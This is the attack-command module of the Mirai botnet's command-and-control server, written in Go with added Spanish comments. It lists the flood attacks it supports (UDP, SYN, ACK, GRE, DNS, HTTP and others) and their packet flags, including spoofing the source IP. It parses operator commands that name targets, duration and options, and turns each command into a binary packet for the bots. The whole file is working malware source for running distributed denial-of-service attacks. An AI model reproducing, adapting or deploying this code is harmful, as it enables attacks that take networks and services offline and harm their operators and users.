/**
 * @file attack.go
 * @brief Implementación del sistema de ataques del servidor CNC de Mirai
 *
 * Este archivo contiene la lógica para:
 * - Definición de tipos de ataques soportados
 * - Parseo y validación de comandos de ataque
 * - Configuración de flags y opciones de ataque
 * - Serialización de comandos para envío a los bots
 */

package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

/**
 * AttackInfo contiene la definición de un tipo de ataque soportado
 */
/**
 * AttackInfo define un tipo específico de ataque soportado por el sistema
 *
 * Esta estructura se usa para validar y configurar ataques, definiendo:
 * - qué flags son permitidos para cada tipo
 * - un identificador único para el protocolo binario
 * - una descripción legible del ataque
 */
type AttackInfo struct {
	attackID          uint8   // ID único para identificar el tipo en el protocolo binario
	attackFlags       []uint8 // Lista de IDs de flags permitidos para este ataque
	attackDescription string  // Descripción legible del tipo de ataque
}

/**
 * Attack representa un ataque configurado y listo para ejecutar
 */
/**
 * Attack representa un ataque configurado y listo para ser ejecutado
 *
 * Esta estructura contiene toda la información necesaria para construir
 * el paquete binario que se enviará a los bots. Los campos permiten
 * especificar:
 * - Duración del ataque
 * - Tipo de ataque (UDP, TCP, HTTP, etc)
 * - Lista de objetivos (IPs/máscaras)
 * - Flags de configuración específicos del ataque
 */
type Attack struct {
	Duration uint32           // Duración del ataque en segundos (máx 3600)
	Type     uint8            // ID del tipo de ataque según AttackInfo
	Targets  map[uint32]uint8 // Mapa de IPs (uint32) a máscaras de red (uint8)
	Flags    map[uint8]string // Mapa de IDs de flags a sus valores configurados
}

/**
 * FlagInfo contiene la definición de un flag de configuración
 */
/**
 * FlagInfo define un flag de configuración disponible para los ataques
 *
 * Los flags permiten configurar parámetros específicos de cada tipo de ataque,
 * como puertos, tamaños de paquete, opciones de protocolo, etc. Cada flag tiene:
 * - Un identificador único usado en el protocolo binario
 * - Una descripción que explica su propósito y valores válidos
 */
type FlagInfo struct {
	flagID          uint8  // ID único usado en el protocolo binario
	flagDescription string // Descripción del flag y sus valores válidos
}

/**
 * flagInfoLookup contiene todas las opciones de configuración disponibles para ataques
 * Mapea nombres de flags a su información y descripción
 */
var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
	"len": FlagInfo{
		0,
		"Size of packet data, default is 512 bytes",
	},
	"rand": FlagInfo{
		1,
		"Randomize packet data content, default is 1 (yes)",
	},
	"tos": FlagInfo{
		2,
		"TOS field value in IP header, default is 0",
	},
	"ident": FlagInfo{
		3,
		"ID field value in IP header, default is random",
	},
	"ttl": FlagInfo{
		4,
		"TTL field in IP header, default is 255",
	},
	"df": FlagInfo{
		5,
		"Set the Dont-Fragment bit in IP header, default is 0 (no)",
	},
	"sport": FlagInfo{
		6,
		"Source port, default is random",
	},
	"dport": FlagInfo{
		7,
		"Destination port, default is random",
	},
	"domain": FlagInfo{
		8,
		"Domain name to attack",
	},
	"dhid": FlagInfo{
		9,
		"Domain name transaction ID, default is random",
	},
	"urg": FlagInfo{
		11,
		"Set the URG bit in IP header, default is 0 (no)",
	},
	"ack": FlagInfo{
		12,
		"Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
	},
	"psh": FlagInfo{
		13,
		"Set the PSH bit in IP header, default is 0 (no)",
	},
	"rst": FlagInfo{
		14,
		"Set the RST bit in IP header, default is 0 (no)",
	},
	"syn": FlagInfo{
		15,
		"Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
	},
	"fin": FlagInfo{
		16,
		"Set the FIN bit in IP header, default is 0 (no)",
	},
	"seqnum": FlagInfo{
		17,
		"Sequence number value in TCP header, default is random",
	},
	"acknum": FlagInfo{
		18,
		"Ack number value in TCP header, default is random",
	},
	"gcip": FlagInfo{
		19,
		"Set internal IP to destination ip, default is 0 (no)",
	},
	"method": FlagInfo{
		20,
		"HTTP method name, default is get",
	},
	"postdata": FlagInfo{
		21,
		"POST data, default is empty/none",
	},
	"path": FlagInfo{
		22,
		"HTTP path, default is /",
	},
	/*"ssl": FlagInfo {
	      23,
	      "Use HTTPS/SSL"
	  },
	*/
	"conns": FlagInfo{
		24,
		"Number of connections",
	},
	"source": FlagInfo{
		25,
		"Source IP address, 255.255.255.255 for random",
	},
}

/**
 * attackInfoLookup define todos los tipos de ataques soportados
 * Cada entrada especifica:
 * - ID único del ataque
 * - Flags permitidos para ese tipo de ataque
 * - Descripción del ataque y su propósito
 */
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	"udp": AttackInfo{
		0,
		[]uint8{2, 3, 4, 0, 1, 5, 6, 7, 25},
		"UDP flood",
	},
	"vse": AttackInfo{
		1,
		[]uint8{2, 3, 4, 5, 6, 7},
		"Valve source engine specific flood",
	},
	"dns": AttackInfo{
		2,
		[]uint8{2, 3, 4, 5, 6, 7, 8, 9},
		"DNS resolver flood using the targets domain, input IP is ignored",
	},
	"syn": AttackInfo{
		3,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"SYN flood",
	},
	"ack": AttackInfo{
		4,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"ACK flood",
	},
	"stomp": AttackInfo{
		5,
		[]uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16},
		"TCP stomp flood",
	},
	"greip": AttackInfo{
		6,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
		"GRE IP flood",
	},
	"greeth": AttackInfo{
		7,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
		"GRE Ethernet flood",
	},
	"udpplain": AttackInfo{
		9,
		[]uint8{0, 1, 7},
		"UDP flood with less options. optimized for higher PPS",
	},
	"http": AttackInfo{
		10,
		[]uint8{8, 7, 20, 21, 22, 24},
		"HTTP flood",
	},
}

/**
 * uint8InSlice verifica si un valor uint8 está presente en una lista
 *
 * Esta función auxiliar se usa principalmente para verificar si un flag
 * está permitido para un tipo específico de ataque.
 *
 * @param a Valor a buscar
 * @param list Lista donde buscar
 * @return true si el valor está presente, false en caso contrario
 */
func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

/**
 * NewAttack crea y configura un nuevo ataque a partir de un comando
 *
 * Esta función parsea un comando de ataque y crea una nueva instancia de Attack
 * con la configuración especificada. El formato del comando es:
 * tipo_ataque objetivos duración [flags...]
 *
 * Ejemplo: "udp 8.8.8.8 30 len=512 dport=53"
 *
 * @param str Comando de ataque a parsear
 * @param admin Nivel de privilegios (1 = admin, 0 = usuario normal)
 * @return Puntero al nuevo ataque configurado y error si hay problemas
 */
func NewAttack(str string, admin int) (*Attack, error) {
	// Inicializa nueva estructura de ataque
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	// Parsea el comando en argumentos
	args, _ := shellwords.Parse(str)

	var atkInfo AttackInfo
	// Parse attack name
	if len(args) == 0 {
		return nil, errors.New("Must specify an attack name")
	} else {
		if args[0] == "?" {
			validCmdList := "\033[37;1mAvailable attack list\r\n\033[36;1m"
			for cmdName, atkInfo := range attackInfoLookup {
				validCmdList += cmdName + ": " + atkInfo.attackDescription + "\r\n"
			}
			return nil, errors.New(validCmdList)
		}
		var exists bool
		atkInfo, exists = attackInfoLookup[args[0]]
		if !exists {
			return nil, errors.New(fmt.Sprintf("\033[33;1m%s \033[31mis not a valid attack!", args[0]))
		}
		atk.Type = atkInfo.attackID
		args = args[1:]
	}

	// Parse targets
	if len(args) == 0 {
		return nil, errors.New("Must specify prefix/netmask as targets")
	} else {
		if args[0] == "?" {
			return nil, errors.New("\033[37;1mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
		}
		cidrArgs := strings.Split(args[0], ",")
		if len(cidrArgs) > 255 {
			return nil, errors.New("Cannot specify more than 255 targets in a single attack!")
		}
		for _, cidr := range cidrArgs {
			prefix := ""
			netmask := uint8(32)
			cidrInfo := strings.Split(cidr, "/")
			if len(cidrInfo) == 0 {
				return nil, errors.New("Blank target specified!")
			}
			prefix = cidrInfo[0]
			if len(cidrInfo) == 2 {
				netmaskTmp, err := strconv.Atoi(cidrInfo[1])
				if err != nil || netmask > 32 || netmask < 0 {
					return nil, errors.New(fmt.Sprintf("Invalid netmask was supplied, near %s", cidr))
				}
				netmask = uint8(netmaskTmp)
			} else if len(cidrInfo) > 2 {
				return nil, errors.New(fmt.Sprintf("Too many /'s in prefix, near %s", cidr))
			}

			ip := net.ParseIP(prefix)
			if ip == nil {
				return nil, errors.New(fmt.Sprintf("Failed to parse IP address, near %s", cidr))
			}
			atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
		}
		args = args[1:]
	}

	// Parse attack duration time
	if len(args) == 0 {
		return nil, errors.New("Must specify an attack duration")
	} else {
		if args[0] == "?" {
			return nil, errors.New("\033[37;1mDuration of the attack, in seconds")
		}
		duration, err := strconv.Atoi(args[0])
		if err != nil || duration == 0 || duration > 3600 {
			return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 3600 seconds", args[0]))
		}
		atk.Duration = uint32(duration)
		args = args[1:]
	}

	// Parse flags
	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "\033[37;1mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
			for _, flagID := range atkInfo.attackFlags {
				for flagName, flagInfo := range flagInfoLookup {
					if flagID == flagInfo.flagID {
						validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
						break
					}
				}
			}
			validFlags += "\r\nValue of 65535 for a flag denotes random (for ports, etc)\r\n"
			validFlags += "Ex: seq=0\r\nEx: sport=0 dport=65535"
			return nil, errors.New(validFlags)
		}
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			return nil, errors.New(fmt.Sprintf("Invalid key=value flag combination near %s", args[0]))
		}
		flagInfo, exists := flagInfoLookup[flagSplit[0]]
		if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
			return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))
		}
		if flagSplit[1][0] == '"' {
			flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
			fmt.Println(flagSplit[1])
		}
		if flagSplit[1] == "true" {
			flagSplit[1] = "1"
		} else if flagSplit[1] == "false" {
			flagSplit[1] = "0"
		}
		atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
		args = args[1:]
	}
	if len(atk.Flags) > 255 {
		return nil, errors.New("Cannot have more than 255 flags")
	}

	return atk, nil
}

/**
 * Build serializa un ataque en formato binario para envío a los bots
 *
 * Esta función convierte la configuración del ataque en un formato binario
 * que los bots pueden interpretar. El formato es:
 * [2B longitud total][4B duración][1B tipo][1B num_objetivos][objetivos...][1B num_flags][flags...]
 *
 * Cada objetivo es: [4B IP][1B máscara]
 * Cada flag es: [1B ID][1B longitud][datos...]
 *
 * @return Buffer con los datos serializados y error si hay problemas
 */
func (this *Attack) Build() ([]byte, error) {
	// Buffer para construir el paquete
	buf := make([]byte, 0)
	var tmp []byte

	// Add in attack duration
	tmp = make([]byte, 4)
	// Escribimos la duración del ataque en formato big endian (4 bytes)
	binary.BigEndian.PutUint32(tmp, this.Duration)
	buf = append(buf, tmp...)

	// Agregamos el tipo de ataque (1 byte)
	buf = append(buf, byte(this.Type))

	// Enviamos el número de objetivos (1 byte)
	buf = append(buf, byte(len(this.Targets)))

	// Enviamos cada objetivo: [IP (4 bytes)][máscara (1 byte)]
	for prefix, netmask := range this.Targets {
		tmp = make([]byte, 5)
		// IP en formato big endian
		binary.BigEndian.PutUint32(tmp, prefix)
		// Máscara de red
		tmp[4] = byte(netmask)
		buf = append(buf, tmp...)
	}

	// Enviamos el número de flags configurados (1 byte)
	buf = append(buf, byte(len(this.Flags)))

	// Enviamos cada flag: [ID (1 byte)][longitud valor (1 byte)][datos del valor]
	for key, val := range this.Flags {
		tmp = make([]byte, 2)
		// ID del flag
		tmp[0] = key
		// Convertimos el valor a bytes
		strbuf := []byte(val)
		// Verificamos que el valor no exceda 255 bytes
		if len(strbuf) > 255 {
			return nil, errors.New("Flag value cannot be more than 255 bytes!")
		}
		// Longitud del valor
		tmp[1] = uint8(len(strbuf))
		// Agregamos el valor
		tmp = append(tmp, strbuf...)
		buf = append(buf, tmp...)
	}

	// Verificamos que no excedamos el tamaño máximo del buffer
	if len(buf) > 4096 {
		return nil, errors.New("Max buffer is 4096")
	}

	// Agregamos la longitud total al principio del buffer (2 bytes)
	// La longitud incluye los 2 bytes del propio campo de longitud
	tmp = make([]byte, 2)
	binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
	buf = append(tmp, buf...)

	return buf, nil
}
